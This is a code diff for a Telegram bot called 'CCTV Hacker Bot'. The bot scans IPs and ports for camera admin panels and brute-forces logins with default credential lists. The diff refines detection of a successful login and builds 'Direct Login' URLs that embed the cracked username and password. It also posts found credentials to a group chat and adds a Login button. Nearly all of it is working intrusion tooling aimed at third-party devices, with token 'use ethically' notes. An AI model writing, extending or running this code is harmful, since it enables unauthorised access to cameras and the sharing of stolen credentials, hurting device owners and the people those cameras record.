@@ -26,7 +26,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Conversation states
-IP, PORT, VULN_INPUT, VULN_PORT = range(4)
+IP, PORT, VULN_INPUT, VULN_PORT, CHECK_LINK_INPUT = range(5)
 
 # Main admin ID
 MAIN_ADMIN_ID = 6972264549
@@ -189,20 +189,28 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
         return ConversationHandler.END
-    keyboard = [
-        [InlineKeyboardButton("Hack", callback_data="start_hack")],
-        [InlineKeyboardButton("Vuln Scan", callback_data="vuln_scan")],
-        [InlineKeyboardButton("Check Link", callback_data="check_link")],
-        [InlineKeyboardButton("Status", callback_data="status")],
-        [InlineKeyboardButton("Help", callback_data="help")],
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    context.user_data.clear()
-    await update.message.reply_text(
-        "🎥 CCTV Hacker Bot! 🚀\nChoose an option to scan or manage devices:",
-        reply_markup=reply_markup
-    )
-    return IP
+    try:
+        context.user_data.clear()  # Clear user_data to avoid state conflicts
+        keyboard = [
+            [InlineKeyboardButton("Hack", callback_data="start_hack")],
+            [InlineKeyboardButton("Vuln Scan", callback_data="vuln_scan")],
+            [InlineKeyboardButton("Check Link", callback_data="check_link")],
+            [InlineKeyboardButton("Status", callback_data="status")],
+            [InlineKeyboardButton("Help", callback_data="help")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            "🎥 CCTV Hacker Bot! 🚀\nChoose an option to scan or manage devices:",
+            reply_markup=reply_markup
+        )
+        return IP
+    except Exception as e:
+        logger.error(f"Start command error: {e}")
+        await update.message.reply_text(
+            "❌ Error starting bot. Try again or contact admin.",
+            reply_markup=main_menu_markup()
+        )
+        return ConversationHandler.END
 
 async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not is_authorized_user(update, context):
@@ -269,79 +277,29 @@ async def vuln_scan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
     context.user_data["scan_type"] = "vuln"
     return VULN_INPUT
 
-async def check_link_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not is_authorized_user(update, context):
-        await update.callback_query.message.reply_text("Contact admin to access the bot.")
-        await update.callback_query.answer()
-        return
-    query = update.callback_query
-    await query.answer()
-    await query.message.reply_text("Enter a URL or IP to check for admin panel (e.g., http://86.103.65.158:8443/login or 192.168.1.1:80/login):")
-    context.user_data["awaiting_checklink"] = True
-
-async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not is_authorized_user(update, context):
-        await update.callback_query.message.reply_text("Contact admin to access the bot.")
-        await update.callback_query.answer()
-        return
-    query = update.callback_query
-    await query.answer()
-    logger.debug("Status callback triggered")
-    await status(update, context, query.message)
-
-async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+async def check_link_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if not is_authorized_user(update, context):
         await update.callback_query.message.reply_text("Contact admin to access the bot.")
         await update.callback_query.answer()
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
-    context.user_data.clear()
-    keyboard = [
-        [InlineKeyboardButton("Hack", callback_data="start_hack")],
-        [InlineKeyboardButton("Vuln Scan", callback_data="vuln_scan")],
-        [InlineKeyboardButton("Check Link", callback_data="check_link")],
-        [InlineKeyboardButton("Status", callback_data="status")],
-        [InlineKeyboardButton("Help", callback_data="help")],
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await query.message.reply_text(
-        "🔙 Back to Main Menu\nChoose an option:", reply_markup=reply_markup
-    )
-    return IP
+    await query.message.reply_text("Enter a URL or IP to check for admin panel (e.g., http://86.103.65.158:8443/login or 192.168.1.1:80/login):")
+    context.user_data["awaiting_checklink"] = True
+    return CHECK_LINK_INPUT
 
-async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not is_authorized_user(update, context):
-        await update.callback_query.message.reply_text("Contact admin to access the bot.")
-        await update.callback_query.answer()
-        return
-    query = update.callback_query
-    await query.answer()
-    keyboard = [[InlineKeyboardButton("Main Menu", callback_data="main_menu")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await query.message.reply_text(
-        "📚 Help - CCTV Hacker Bot\n"
-        "1. Hack: Scan IPs/ports\n"
-        "2. Vuln Scan: Check vulnerabilities\n"
-        "3. Check Link: Test URLs for admin panels\n"
-        "4. Status: Bot health\n"
-        "5. Inline buttons for actions\n"
-        "⚠️ Use ethically!",
-        reply_markup=reply_markup
-    )
-
-async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def check_link_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
-        return
-    if not (context.user_data.get("awaiting_checklink", False) or (context.args and len(context.args) > 0)):
+        return ConversationHandler.END
+    if not context.user_data.get("awaiting_checklink", False):
         await update.message.reply_text(
-            "Enter a URL or IP to check for admin panel (e.g., http://86.103.65.158:8443/login or 192.168.1.1:80/login):",
+            "Use the 'Check Link' button to start this action.",
             reply_markup=main_menu_markup()
         )
-        return
+        return ConversationHandler.END
 
-    input_text = update.message.text.strip() if context.user_data.get("awaiting_checklink") else context.args[0].strip()
+    input_text = update.message.text.strip()
     context.user_data["awaiting_checklink"] = False
     logger.debug(f"Check Link input: {input_text}")
 
@@ -405,6 +363,59 @@ async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
             f"❌ Error checking URL: {str(e)}",
             reply_markup=main_menu_markup()
         )
+
+    return ConversationHandler.END
+
+async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not is_authorized_user(update, context):
+        await update.callback_query.message.reply_text("Contact admin to access the bot.")
+        await update.callback_query.answer()
+        return
+    query = update.callback_query
+    await query.answer()
+    logger.debug("Status callback triggered")
+    await status(update, context, query.message)
+
+async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    if not is_authorized_user(update, context):
+        await update.callback_query.message.reply_text("Contact admin to access the bot.")
+        await update.callback_query.answer()
+        return ConversationHandler.END
+    query = update.callback_query
+    await query.answer()
+    context.user_data.clear()
+    keyboard = [
+        [InlineKeyboardButton("Hack", callback_data="start_hack")],
+        [InlineKeyboardButton("Vuln Scan", callback_data="vuln_scan")],
+        [InlineKeyboardButton("Check Link", callback_data="check_link")],
+        [InlineKeyboardButton("Status", callback_data="status")],
+        [InlineKeyboardButton("Help", callback_data="help")],
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.message.reply_text(
+        "🔙 Back to Main Menu\nChoose an option:", reply_markup=reply_markup
+    )
+    return IP
+
+async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not is_authorized_user(update, context):
+        await update.callback_query.message.reply_text("Contact admin to access the bot.")
+        await update.callback_query.answer()
+        return
+    query = update.callback_query
+    await query.answer()
+    keyboard = [[InlineKeyboardButton("Main Menu", callback_data="main_menu")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.message.reply_text(
+        "📚 Help - CCTV Hacker Bot\n"
+        "1. Hack: Scan IPs/ports\n"
+        "2. Vuln Scan: Check vulnerabilities\n"
+        "3. Check Link: Test URLs for admin panels\n"
+        "4. Status: Bot health\n"
+        "5. Inline buttons for actions\n"
+        "⚠️ Use ethically!",
+        reply_markup=reply_markup
+    )
 
 async def vuln_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if not is_authorized_user(update, context):
@@ -674,7 +685,7 @@ async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
                 if not all(1 <= p <= 65535 for p in ports):
                     raise ValueError("Ports must be 1-65535.")
             else:
-                port = int(port_input)
+                port = int(port_value)
                 if not (1 <= port <= 65535):
                     raise ValueError("Port must be 1-65535.")
                 ports = [port]
@@ -791,6 +802,31 @@ async def hack_cctv(ip: str, port: int, scan_type: str, geo_text: str) -> tuple[
                 except Exception as e:
                     return False, url, [f"Error: {str(e)}"]
 
+        async def verify_credentials(url: str, username: str, password: str) -> bool:
+            try:
+                async with ClientSession(timeout=ClientTimeout(total=5)) as session:
+                    async with session.post(
+                        url,
+                        data={"username": username, "password": password},
+                        ssl=False,
+                        allow_redirects=True
+                    ) as response:
+                        if response.status != 200:
+                            return False
+                        html = await response.text()
+                        if "login" in html.lower() or "password" in html.lower():
+                            return False
+                        if response.url.path != urlparse(url).path and any(
+                            keyword in response.url.path.lower() for keyword in ["dashboard", "admin", "panel"]
+                        ):
+                            return True
+                        if any(keyword in html.lower() for keyword in ["dashboard", "admin", "welcome"]):
+                            return True
+                        return False
+            except Exception as e:
+                logger.error(f"Credential verification error for {url}: {e}")
+                return False
+
         if service == "http" and scan_type in ["standard", "special"]:
             protocols = ["http", "https"] if port in [443, 8443] else ["http"]
             tasks = [check_path(protocol, path) for protocol in protocols for path in ADMIN_PATHS]
@@ -827,18 +863,21 @@ async def hack_cctv(ip: str, port: int, scan_type: str, geo_text: str) -> tuple[
                     rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
                     potential_links.append((rtsp_url, username, password))
                     results.append(f"🎯 Found: {username}:{password}")
-                async with ClientSession(timeout=ClientTimeout(total=5)) as session:
-                    for path in ADMIN_PATHS:
-                        url = f"http://{ip}:{port}{path}"
-                        try:
-                            async with session.post(url, data={"username": username, "password": password}, ssl=False) as response:
-                                if response.status == 200:
-                                    html = await response.text()
-                                    if any(keyword in html.lower() for keyword in ["dashboard", "admin"]):
-                                        admin_pages.append(url)
-                                        results.append(f"🎯 Found Admin: {url} ({username}:{password})")
-                        except Exception as e:
-                            logger.error(f"Brute force error for {url}: {e}")
+                for path in ADMIN_PATHS:
+                    url = f"http://{ip}:{port}{path}"
+                    try:
+                        async with ClientSession(timeout=ClientTimeout(total=5)) as session:
+                            async with session.post(
+                                url,
+                                data={"username": username, "password": password},
+                                ssl=False
+                            ) as response:
+                                if response.status == 200 and await verify_credentials(url, username, password):
+                                    direct_url = f"http://{username}:{password}@{ip}:{port}{path}"
+                                    admin_pages.append(url)
+                                    results.append(f"🎯 Found Admin: {url} ({username}:{password})\nDirect Login: {direct_url}")
+                    except Exception as e:
+                        logger.error(f"Brute force error for {url}: {e}")
 
         results.append("⚠️ Use ethically and legally.")
 
@@ -865,7 +904,7 @@ async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 
     if not admin_url:
         await query.message.reply_text(
-            "No valid admin URL found to brute-force. Run /checklink again.",
+            "No valid admin URL found to brute-force. Use 'Check Link' button.",
             reply_markup=main_menu_markup()
         )
         return
@@ -885,7 +924,7 @@ async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     )
 
     semaphore = asyncio.Semaphore(5)
-    async def try_creds(url: str, username: str, password: str) -> bool:
+    async def try_creds(url: str, username: str, password: str) -> tuple[bool, str]:
         async with semaphore:
             try:
                 async with ClientSession(timeout=ClientTimeout(total=5)) as session:
@@ -895,26 +934,37 @@ async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
                         ssl=False,
                         allow_redirects=True
                     ) as response:
-                        if response.status == 200:
-                            html = await response.text()
-                            if any(keyword in html.lower() for keyword in ["dashboard", "admin"]):
-                                return True
-                        return False
+                        if response.status != 200:
+                            return False, ""
+                        html = await response.text()
+                        if "login" in html.lower() or "password" in html.lower():
+                            return False, ""
+                        if response.url.path != urlparse(url).path and any(
+                            keyword in response.url.path.lower() for keyword in ["dashboard", "admin", "panel"]
+                        ):
+                            direct_url = f"http://{username}:{password}@{ip}:{port}{urlparse(url).path}"
+                            return True, direct_url
+                        if any(keyword in html.lower() for keyword in ["dashboard", "admin", "welcome"]):
+                            direct_url = f"http://{username}:{password}@{ip}:{port}{urlparse(url).path}"
+                            return True, direct_url
+                        return False, ""
             except Exception as e:
                 logger.error(f"Brute force error for {url}: {e}")
-                return False
+                return False, ""
 
     found = False
     found_credentials = None
+    direct_login_url = ""
 
     for username, password in BRUTE_COMBOS:
         if not context.user_data.get("brute_force_running", False) or context.bot_data.get("stop_all", False):
             break
-        success = await try_creds(admin_url, username, password)
+        success, direct_url = await try_creds(admin_url, username, password)
         checked += 1
         if success:
             found = True
             found_credentials = (username, password)
+            direct_login_url = direct_url
             context.user_data["brute_force_running"] = False
             break
         if checked % 100 == 0:
@@ -951,14 +1001,14 @@ async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 
     if found:
         await query.message.reply_text(
-            f"🎯 Found: {found_credentials[0]}:{found_credentials[1]}\nURL: {admin_url}",
+            f"🎯 Found: {found_credentials[0]}:{found_credentials[1]}\nURL: {admin_url}\nDirect Login: {direct_login_url}",
             parse_mode="Markdown",
-            reply_markup=main_menu_markup()
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Login", url=direct_login_url), InlineKeyboardButton("Main Menu", callback_data="main_menu")]])
         )
         try:
             await context.bot.send_message(
                 chat_id=GROUP_CHAT_ID,
-                text=f"🎯 Found for {ip}:{port}!\n{found_credentials[0]}:{found_credentials[1]}\n{admin_url}",
+                text=f"🎯 Found for {ip}:{port}!\n{found_credentials[0]}:{found_credentials[1]}\n{admin_url}\nDirect Login: {direct_login_url}",
                 parse_mode="Markdown"
             )
             await asyncio.sleep(0.1)
@@ -1023,7 +1073,7 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE, message=Non
         await update.message.reply_text("Contact admin to access the bot.")
         return
     logger.debug("Status check")
-    reply_text = "Bot online! Use /start, /hack, /checklink, or /vuln."
+    reply_text = "Bot online! Use /start, /hack, or buttons."
     if message:
         await message.reply_text(reply_text, reply_markup=main_menu_markup())
     else:
@@ -1091,6 +1141,7 @@ def main() -> None:
             PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, port)],
             VULN_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, vuln_input)],
             VULN_PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, vuln_port)],
+            CHECK_LINK_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_link_input)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
     )
@@ -1099,11 +1150,9 @@ def main() -> None:
     application.add_handler(CommandHandler("add", add_user))
     application.add_handler(CommandHandler("remove", remove_user))
     application.add_handler(CommandHandler("status", status))
-    application.add_handler(CommandHandler("checklink", check_link))
     application.add_handler(CommandHandler("reboot", reboot))
     application.add_handler(CallbackQueryHandler(hunt_password, pattern="^hunt_"))
     application.add_handler(CallbackQueryHandler(stop_brute_force, pattern="^stop_"))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_link))
 
     import threading
     keep_alive_loop = asyncio.new_event_loop()
